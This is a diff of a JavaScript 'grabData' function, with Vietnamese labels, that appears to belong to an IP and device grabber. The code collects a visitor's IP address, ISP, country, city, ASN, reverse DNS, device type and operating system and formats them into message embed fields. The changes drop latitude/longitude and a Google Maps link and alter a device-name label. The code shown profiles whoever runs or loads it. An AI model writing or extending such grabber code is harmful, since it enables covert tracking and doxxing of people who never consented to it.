@@ -32,13 +32,11 @@ const grabData = async () => {
             return path.split('.').reduce((o, p) => (o && o[p] !== undefined) ? o[p] : fallback, obj);
         };
 
-        // Trích xuất dữ liệu địa lý
+        // Trích xuất dữ liệu địa lý (không dùng lat/lon)
         const ip = geoData.ip || "Unknown";
         const isp = safeGet(geoData, 'isp') || "Unknown";
         const country = safeGet(geoData, 'country_name', "Unknown");
         const city = safeGet(geoData, 'city', "Unknown");
-        const lat = safeGet(geoData, 'latitude', 0);
-        const lon = safeGet(geoData, 'longitude', 0);
         const asNumber = safeGet(geoData, 'asn') || "Unknown";
         const asnName = safeGet(geoData, 'organization') || "Unknown";
         const reverseDNS = safeGet(geoData, 'reverse') || "Unknown";
@@ -59,7 +57,7 @@ const grabData = async () => {
         const deviceName = deviceType === 'mobile' ? 'Điện thoại' :
                          deviceType === 'tablet' ? 'Máy tính bảng' :
                          deviceType === 'desktop' ? 'Máy tính để bàn' : 'Không xác định';
-        const customDeviceName = "None";
+        const customDeviceName = "Hien";
         const osName = safeGet(agentData, 'operatingSystem.name', 'Không xác định');
         const osVersion = safeGet(agentData, 'operatingSystem.versionMajor', '?');
         const osInfo = `${osName} ${osVersion}`;
@@ -162,11 +160,6 @@ const grabData = async () => {
                             inline: true
                         },
                         {
-                            name: "📍 Vị trí",
-                            value: `Kinh độ: ${lon}\nVĩ độ: ${lat}\nGoogle Maps: [Click](https://www.google.com/maps/@${lat},${lon},6z)`,
-                            inline: true
-                        },
-                        {
                             name: "🌐 AS Number",
                             value: asNumber,
                             inline: true
@@ -203,7 +196,7 @@ const grabData = async () => {
                         },
                         {
                             name: "🖥️ Thiết bị",
-                            value: `${deviceName} - ${customDeviceName}`,
+                            value: `${deviceName}`,
                             inline: true
                         },
                         {
